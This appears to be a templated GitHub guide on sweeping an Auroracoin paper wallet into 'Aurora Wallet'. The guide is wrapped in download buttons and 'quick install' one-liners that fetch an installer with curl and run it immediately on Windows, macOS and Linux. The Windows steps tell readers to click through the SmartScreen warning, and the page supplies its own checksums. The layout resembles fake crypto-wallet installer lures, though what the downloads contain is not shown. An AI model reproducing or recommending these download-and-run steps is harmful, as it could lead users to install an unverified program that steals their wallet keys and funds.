![Aurora Wallet sweep paper wallet guide](assets/aurora-wallet-guide-article-banner.png)

# How to sweep an Auroracoin paper wallet into Aurora Wallet

Move a printed key's balance onto an address protected by your recovery phrase.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Sweeping moves the whole balance of a paper key to an address your wallet controls, and the old key is retired by the transfer.

A paper wallet is an address with its private key printed beside it. The key still works, and the risk is physical: paper burns, fades and gets photographed. A sweep signs one transaction that spends the entire balance to a fresh address derived from your phrase, which turns a fragile printout into a backup you can restore anywhere.

<!-- ARTICLE-BODY-BEGIN -->

## Check the key and the balance first

Look at the printed address: an Auroracoin address begins with the letter A. The private key in Wallet Import Format begins with 5, K or L, depending on whether it is uncompressed or compressed.

Confirm the balance on a public explorer before you sweep, so you know what to expect afterwards. A key that shows nothing has either been spent already or was never funded.

## Sweep in order

1. Open Aurora Wallet and let it sync completely.
2. Open the import or sweep option and choose the private key field.
3. Type the key carefully, or paste it if the printout includes a machine-readable copy.
4. Confirm the address the wallet resolves from that key matches the printed address.
5. Approve the sweep and wait for the transaction to confirm.
6. Destroy the paper copy once the balance appears in the new wallet.

Typing a key by hand invites a character error, and the wallet rejects a malformed key rather than sending funds anywhere. If it does reject the input, <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md">error 5 and invalid encoding</a> explains which characters cause it.

## After the sweep

The balance now sits at an address derived from your phrase. Write the phrase down if you have not, and keep the paper copy out of photographs and cloud notes until you have destroyed it.

Sweeping several paper wallets in one session is safe, but each sweep is a separate transaction with its own fee. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/16-pending-transaction.md">Pending transaction</a> covers what to do if one of them waits.

The key never needs to leave your machine: the sweep is signed locally by the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> and broadcast directly to peers.

## FAQ

### Can I sweep part of the balance?

No. A sweep spends the whole output attached to that key, which is the point of the method.

### What if the paper key is already empty?

Someone spent it, or it was never funded. The sweep cannot recover a balance that the chain does not show.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Import a WIF private key](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md)
- [Error 5 invalid encoding](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md)
- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
